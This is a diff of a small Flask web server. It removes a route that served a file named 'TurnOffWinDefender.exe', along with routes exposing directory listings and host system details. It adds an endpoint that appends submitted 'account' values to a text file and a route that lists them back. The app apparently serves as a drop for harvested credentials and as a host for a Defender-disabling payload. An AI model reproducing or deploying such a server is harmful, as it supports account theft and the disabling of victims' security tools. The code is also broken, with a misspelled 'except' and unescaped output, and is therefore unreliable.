@@ -9,71 +9,34 @@ app = Flask(__name__)
 
 @app.route('/')
 def homepage():
-	the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")
-
 	return """
-	    <h1>Hello heroku</h1>
-	    <p>It is currently {time}.</p>
-
-	    <img src="http://loremflickr.com/600/400" />
-	    """.format(time=the_time)
-#===========================download file================================
-@app.route('/return-files/')
-def return_files_tut():
-	try:
-		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
-	except Exception as e:
-		return str(e)
-	
+	    <h1>Sever OK</h1>
+	    """
 
 	
 #========================upload file=====================================
-@app.route('/upload')  
-def upload():
-	return render_template("file_upload_form.html")  
  
-@app.route('/success', methods = ['POST'])  
+@app.route('/upload', methods = ['POST'])  
 def success():
-	if request.method == 'POST':  
-		f = request.files['file']  
-		f.save(f.filename)  
-		return render_template("success.html", name = f.filename)  
+	if request.method == 'POST':
+		try:
+			account = request.form.get('account')
+			with open("account.txt", 'a', encoding = 'utf-8') as f:
+				f.write(account)
+			return "success"
+		excapt Exception as e:
+			return "error: "+ e
 
 #===============================chat=====================================
-@app.route('/chat')  
+@app.route('/get-account')  
 def chat():
-	with open('dem.txt','r') as f:
-    		line = f.read()
-		
-	d = str(int(line) +1)
-	
-	with open('dem.txt','w') as f:
-    		line = f.write(d)
-		
-	return d 
-#========================================================================
-
-
-
-@app.route('/getinfo')
-def getinfo():
+	with open('account.txt','r') as f:
+    		lines = [line.rstrip() for line in f]
 	s = ""
-	arr = os.listdir(os.path.normpath(os.getcwd()))
-	for i in arr :
-		s += str(i) + "\n"
+	for i in lines:
+		s+=f"<p>{i}</p>/n"
 	return s
-
-@app.route('/getinfopc')
-def getinfopc():
-	txt = f"""
-	<h1>Machine: {platform.machine()}</h1>
-	<h1>Version: {platform.version()}</h1>
-	<h1>Plastform: {platform.platform()}</h1>
-	<h1>Uname: {platform.uname()}</h1>
-	<h1>System: {platform.system()}</h1>
-	<h1>Processor: {platform.processor()}</h1>
-"""
-	return txt
+#========================================================================
 
 
 if __name__ == '__main__':
